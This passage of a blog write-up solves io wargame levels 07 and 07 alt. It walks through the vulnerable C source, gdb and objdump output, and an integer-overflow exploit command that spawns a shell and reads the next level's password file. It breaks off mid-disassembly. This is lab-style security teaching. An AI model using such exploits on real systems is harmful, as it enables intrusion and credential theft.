<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">//written by bla</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">count</span> <span class="o">&gt;=</span> <span class="mi">10</span> <span class="p">)</span>
</span><span class='line'>                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">count</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mh">0x574f4c46</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;WIN!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>                <span class="n">execl</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="s">&quot;sh&quot;</span> <span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span> <span class="k">else</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Not today son</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>What&rsquo;s clear here is that we need to pass a number in that is less than <code>10</code>, but is big enough to allow us to overflow <code>buf</code> so that we can modify the value of <code>count</code>. The data that&rsquo;s written to <code>buf</code> is only allowed to be <code>count * sizeof(int)</code> in size.  We can easily pass in numbers smaller than 10, but they won&rsquo;t be big enough to overflow <code>buf</code>. If we pass in a <em>negative</em> number we bypass the check, but the call to <code>memcpy</code> will fail because <code>count * sizeof(int)</code> is negative.</p>

<p>We need to find a way of turning this calculation into something positive, but also much bigger than <code>10 * sizeof(int)</code> so that we can overflow <code>buf</code>.</p>

<p>What&rsquo;s interesting about this is that <code>sizeof(int)</code> on a 32-bit machine is <code>4</code>, which is effectively a <code>SHL 2</code> operation. We can confirm this by disassembling <code>main</code> and looking at the generated output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb<span class="nv">$ </span>disas main
</span><span class='line'>Dump of assembler code <span class="k">for function </span>main:
</span><span class='line'>0x08048414 &lt;main+0&gt;:    push   ebp
</span><span class='line'>0x08048415 &lt;main+1&gt;:    mov    ebp,esp
</span><span class='line'>0x08048417 &lt;main+3&gt;:    sub    esp,0x68
</span><span class='line'>0x0804841a &lt;main+6&gt;:    and    esp,0xfffffff0
</span><span class='line'>0x0804841d &lt;main+9&gt;:    mov    eax,0x0
</span><span class='line'>0x08048422 &lt;main+14&gt;:   sub    esp,eax
</span><span class='line'>0x08048424 &lt;main+16&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
</span><span class='line'>0x08048427 &lt;main+19&gt;:   add    eax,0x4
</span><span class='line'>0x0804842a &lt;main+22&gt;:   mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
</span><span class='line'>0x0804842c &lt;main+24&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'>0x0804842f &lt;main+27&gt;:   call   0x8048354 &lt;atoi@plt&gt;
</span><span class='line'>0x08048434 &lt;main+32&gt;:   mov    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,eax
</span><span class='line'>0x08048437 &lt;main+35&gt;:   cmp    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,0x9
</span><span class='line'>0x0804843b &lt;main+39&gt;:   jle    0x8048446 &lt;main+50&gt;
</span><span class='line'>0x0804843d &lt;main+41&gt;:   mov    DWORD PTR <span class="o">[</span>ebp-0x4c<span class="o">]</span>,0x1
</span><span class='line'>0x08048444 &lt;main+48&gt;:   jmp    0x80484ad &lt;main+153&gt;
</span><span class='line'>0x08048446 &lt;main+50&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>
</span><span class='line'>0x08048449 &lt;main+53&gt;:   shl    eax,0x2                          &lt;- here
</span><span class='line'>0x0804844c &lt;main+56&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,eax
</span><span class='line'>0x08048450 &lt;main+60&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
</span><span class='line'>0x08048453 &lt;main+63&gt;:   add    eax,0x8
</span><span class='line'>0x08048456 &lt;main+66&gt;:   mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
</span><span class='line'>0x08048458 &lt;main+68&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
</span><span class='line'>0x0804845c &lt;main+72&gt;:   lea    eax,<span class="o">[</span>ebp-0x48<span class="o">]</span>
</span><span class='line'>0x0804845f &lt;main+75&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'>0x08048462 &lt;main+78&gt;:   call   0x8048334 &lt;memcpy@plt&gt;
</span><span class='line'>0x08048467 &lt;main+83&gt;:   cmp    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,0x574f4c46
</span><span class='line'>0x0804846e &lt;main+90&gt;:   jne    0x804849a &lt;main+134&gt;
</span><span class='line'>0x08048470 &lt;main+92&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048584
</span><span class='line'>0x08048477 &lt;main+99&gt;:   call   0x8048344 &lt;<span class="nb">printf</span>@plt&gt;
</span><span class='line'>0x0804847c &lt;main+104&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x0
</span><span class='line'>0x08048484 &lt;main+112&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x804858a
</span><span class='line'>0x0804848c &lt;main+120&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x804858d
</span><span class='line'>0x08048493 &lt;main+127&gt;:  call   0x8048324 &lt;execl@plt&gt;
</span><span class='line'>0x08048498 &lt;main+132&gt;:  jmp    0x80484a6 &lt;main+146&gt;
</span><span class='line'>0x0804849a &lt;main+134&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048595
</span><span class='line'>0x080484a1 &lt;main+141&gt;:  call   0x8048344 &lt;<span class="nb">printf</span>@plt&gt;
</span><span class='line'>0x080484a6 &lt;main+146&gt;:  mov    DWORD PTR <span class="o">[</span>ebp-0x4c<span class="o">]</span>,0x0
</span><span class='line'>0x080484ad &lt;main+153&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp-0x4c<span class="o">]</span>
</span><span class='line'>0x080484b0 &lt;main+156&gt;:  leave
</span><span class='line'>0x080484b1 &lt;main+157&gt;:  ret
</span><span class='line'>End of assembler dump.
</span></code></pre></td></tr></table></div></figure>


<p>Some investigation of the behaviour of this instruction lead me to realise that there was room for abuse when values over/underflow. If we use <code>SHL</code> with numbers of a small enough negative value, those values become positive. Let&rsquo;s have a look at that in action by whipping up a sample program and viewing the output:</p>

<figure class='code'><figcaption><span>Testing Shifts Source </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2147483647</span><span class="p">;</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Compile this code with <code>gcc</code> and run it, and you&rsquo;ll find the following:</p>

<figure class='code'><figcaption><span>Testing Shifts </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level7@io:/tmp/tc7<span class="nv">$ </span>./a.out
</span><span class='line'>0x80000001
</span><span class='line'>0x4
</span><span class='line'>0x44
</span><span class='line'>0x84
</span></code></pre></td></tr></table></div></figure>


<p>So we can pass in a negative integer, have it shift and turn it into a positive that&rsquo;s big enough to overflow the buffer. Once we&rsquo;ve overflowed, all we need to do is write the value <code>0x574f4c46</code> to the desired memory location and the level will pass. We can get smart and figure out exactly where this needs to be, or we can go with the approach of repeatedly writing it knowing that somewhere along the line it&rsquo;ll end up being written to where we need it to be: in the <code>count</code> varaible. I chose to do the latter. We pass this data in as the second argument on the command line. Let&rsquo;s see how this looks:</p>

<figure class='code'><figcaption><span>Exploit Run </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level7@io:<span class="nv">$ </span>/levels/level07 -2147483600 <span class="sb">`</span>perl -e <span class="s1">&#39;print &quot;\x46\x4c\x4f\x57&quot; x 100&#39;</span><span class="sb">`</span>
</span><span class='line'>WIN!
</span><span class='line'>sh-4.1<span class="nv">$ </span>cat /home/level8/.pass
</span><span class='line'>&lt;&lt; -- password was printed here -- &gt;&gt;
</span></code></pre></td></tr></table></div></figure>


<p>This level was relatively simple, but was good exposure to the idea of how integer underflows can cause problems.</p>

<h2>Level 07 alt</h2>

<p>Let&rsquo;s start with the source of the alternate application, modified a little by me (and highlighted):</p>

<figure class='code'><figcaption><span>level07_alt.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/* </span>
</span><span class='line'><span class="cm">    Coding by LarsH</span>
</span><span class='line'>
</span><span class='line'><span class="cm">    PJYN GIEZIRC FRD RBNE OM QNML PE ZMP PJM BMPPMI AIMHQMDFYMN AIEC R PMUP,</span>
</span><span class='line'><span class="cm">    this program can also be used to get the letter frequencies from a text  &lt;-- I added this</span>
</span><span class='line'><span class="cm">    TJYFJ JMBGN TJMD FIRFWYDZ NPRDLRIL CEDENQONPYPQPYED FYGJMIN.</span>
</span><span class='line'><span class="cm">    which helps when cracking standard monosubstitution ciphers              &lt;-- I added this</span>
</span><span class='line'>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="kt">int</span> <span class="n">count</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s words</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="cm">/* Clear out the frequency buffer */</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>        <span class="n">count</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="cm">/* Fill the frequency buffer */</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="n">argv</span><span class="p">[</span><span class="n">j</span><span class="p">];</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">argv</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">i</span><span class="p">];</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>            <span class="n">count</span><span class="p">[</span><span class="n">argv</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">i</span><span class="p">]]</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="cm">/* Print out the frequency buffer */</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">count</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%c found %i time%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">count</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">count</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span><span class="o">?</span><span class="s">&quot;s&quot;</span><span class="o">:</span><span class="s">&quot;&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>On the surface it&rsquo;s hard to see where this application could be attacked! It&rsquo;s one of those bit of code that seems rather non-descript, yes has a very subtle issue in it which will allow us to gain some form of control. The obvious thing to look for is where memory is modified as a result of our user input, and this leads us to the following line:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">count</span><span class="p">[</span><span class="n">argv</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">i</span><span class="p">]]</span><span class="o">++</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here the code is using the <code>j</code>th word (passed in on the command line via <code>argv</code>) and accessing its <code>i</code>th character, then using this character as an index into <code>count</code> to increment the count for that letter. The application is obviously doing a simple letter-tally. Straight up this looks like a potential point of attack because the values in <code>argv</code> are <em>signed</em> characters, and hence we can pass in values that are <strong>negative</strong> and write outside the bounds of the <code>count</code> array. Let&rsquo;s <code>objdump</code> the binary to see where <code>count</code> lives:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>objdump -D /levels/level07_alt | grep count
</span><span class='line'>08049720 &lt;count&gt;:
</span></code></pre></td></tr></table></div></figure>


<p>The negative values we can use are from <code>CHAR_MIN</code> (<code>-128</code>) &times; <code>sizeof(int)</code> (<code>4</code> on a 32-bit system) to <code>0</code>. So with <code>count</code> located at <code>0x8049720</code>, it means we can write values from here, all the way back to <code>0x8049520</code>. Let&rsquo;s see what fits within this range, again by looking at the output of <code>objdump</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>objdump -D /levels/level07_alt
</span><span class='line'>... snip ...
</span><span class='line'>
</span><span class='line'>Disassembly of section .ctors:
</span><span class='line'>
</span><span class='line'>080495ec &lt;__CTOR_LIST__&gt;:
</span><span class='line'> 80495ec: ff                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 80495ed: ff                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 80495ee: ff                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 80495ef: ff 00                   incl   <span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>080495f0 &lt;__CTOR_END__&gt;:
</span><span class='line'> 80495f0: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>Disassembly of section .dtors:
</span><span class='line'>
</span><span class='line'>080495f4 &lt;__DTOR_LIST__&gt;:
</span><span class='line'> 80495f4: ff                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 80495f5: ff                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 80495f6: ff                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 80495f7: ff 00                   incl   <span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>080495f8 &lt;__DTOR_END__&gt;:
</span><span class='line'> 80495f8: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>Disassembly of section .jcr:
</span><span class='line'>
</span><span class='line'>080495fc &lt;__JCR_END__&gt;:
</span><span class='line'> 80495fc: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>Disassembly of section .dynamic:
</span><span class='line'>
</span><span class='line'>08049600 &lt;_DYNAMIC&gt;:
</span><span class='line'> 8049600: 01 00                   add    %eax,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049602: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049604: 10 00                   adc    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049606: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049608: 0c 00                   or     <span class="nv">$0x0</span>,%al
</span><span class='line'> 804960a: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804960c: 78 82                   js     8049590 &lt;__FRAME_END__+0xfa8&gt;
</span><span class='line'> 804960e: 04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 8049610: 0d 00 00 00 9c          or     <span class="nv">$0x9c000000</span>,%eax
</span><span class='line'> 8049615: 85 04 08                <span class="nb">test</span>   %eax,<span class="o">(</span>%eax,%ecx,1<span class="o">)</span>
</span><span class='line'> 8049618: 04 00                   add    <span class="nv">$0x0</span>,%al
</span><span class='line'> 804961a: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804961c: 48                      dec    %eax
</span><span class='line'> 804961d: 81 04 08 f5 fe ff 6f    addl   <span class="nv">$0x6ffffef5</span>,<span class="o">(</span>%eax,%ecx,1<span class="o">)</span>
</span><span class='line'> 8049624: 70 81                   jo     80495a7 &lt;__FRAME_END__+0xfbf&gt;
</span><span class='line'> 8049626: 04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 8049628: 05 00 00 00 e0          add    <span class="nv">$0xe0000000</span>,%eax
</span><span class='line'> 804962d: 81 04 08 06 00 00 00    addl   <span class="nv">$0x6</span>,<span class="o">(</span>%eax,%ecx,1<span class="o">)</span>
</span><span class='line'> 8049634: 90                      nop
</span><span class='line'> 8049635: 81 04 08 0a 00 00 00    addl   <span class="nv">$0xa</span>,<span class="o">(</span>%eax,%ecx,1<span class="o">)</span>
</span><span class='line'> 804963c: 4c                      dec    %esp
</span><span class='line'> 804963d: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
